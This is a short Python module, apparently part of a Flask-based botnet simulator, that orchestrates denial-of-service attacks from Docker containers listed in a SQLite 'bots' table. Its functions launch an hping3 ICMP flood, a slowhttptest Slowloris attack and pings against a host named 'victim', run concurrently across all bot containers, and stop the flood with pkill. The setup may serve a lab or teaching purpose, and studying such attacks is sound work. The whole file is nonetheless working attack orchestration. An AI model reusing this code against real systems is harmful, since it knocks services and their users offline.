import docker, threading, sqlite3
from flask import request
from .settings import client


def ping(container_id):
    container = client.containers.get(container_id)
    result = container.exec_run("ping -c 4 victim")
    print(result.output.decode())


def icmp_flood(container_id):
    container = client.containers.get(container_id)
    result = container.exec_run("hping3 --icmp --flood victim")
    print(result.output.decode())


def slowloris(container_id, number_of_connections):
    container = client.containers.get(container_id)
    result = container.exec_run(
        f"slowhttptest -c {number_of_connections} -g -u http://victim"
    )
    print(result.output.decode())


def execute_attack(attack, *args):
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT container_id FROM bots")
    result = cursor.fetchall()
    container_ids = [x[0] for x in result]
    threads = [
        threading.Thread(target=attack, args=(container_id, *args))
        for container_id in container_ids
    ]

    # Spuštění všech vláken
    for thread in threads:
        thread.start()
    # Čekání na dokončení všech vláken
    for thread in threads:
        thread.join()

    conn.close()
    return "Attack finished"


def stop_attack(container_id):
    container = client.containers.get(container_id)
    result = container.exec_run("pkill hping3")
    print(result.output.decode())
